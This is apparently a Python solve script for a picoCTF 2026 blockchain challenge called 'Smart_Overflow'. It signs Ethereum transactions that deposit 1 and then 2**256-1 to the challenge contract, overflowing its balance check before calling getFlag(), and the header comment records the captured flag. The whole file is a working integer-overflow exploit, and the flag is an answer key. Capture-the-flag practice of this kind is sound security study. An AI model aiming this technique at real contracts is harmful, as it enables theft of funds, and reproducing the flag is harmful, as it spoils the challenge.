# 760 - Smart_Overflow  (Blockchain, picoCTF 2026)
# Flag: academy{Sm4r7_OverFL0ws_ExI5t_bfaa16cd}
# Write-up: ../../../writeups/blockchain/760-smart-overflow.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, json, time
sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
from ethlight import RPC, sign_tx, priv_to_address, selector, enc_uint, dec_string

info = json.load(open("./_z_760info.json"))
rpc = RPC(info["eth"])
PK = info["pk"]
CONTRACT = info["contract"]
me = priv_to_address(PK)
print("moi:", me)
chain = int(rpc.call("eth_chainId"), 16)
gas_price = int(rpc.call("eth_gasPrice"), 16)
nonce = int(rpc.call("eth_getTransactionCount", [me, "pending"]), 16)
print("chainId:", chain, "nonce:", nonce)

sel_dep = selector("deposit(uint256)")
sel_get = selector("getFlag()")
print("sel deposit:", sel_dep, "| sel getFlag:", sel_get)

bal = rpc.call_data(CONTRACT, selector("balances(address)") + enc_uint(int(me, 16)))
print("solde initial:", int(bal, 16) if bal and bal != "0x" else 0)

for amount in (1, 2 ** 256 - 1):
    data = sel_dep + enc_uint(amount)
    signed = sign_tx(PK, CONTRACT, data=bytes.fromhex(data[2:]), nonce=nonce,
                     gas=150000, gas_price=gas_price, chain_id=chain)
    txh = rpc.send_tx(signed)
    rc = rpc.wait(txh)
    print(f"deposit({amount}) -> {txh[:20]}... status={rc.get('status') if rc else None}")
    nonce += 1

out = rpc.call_data(CONTRACT, sel_get, me)
print("getFlag brut:", out)
print("FLAG:", dec_string(out))
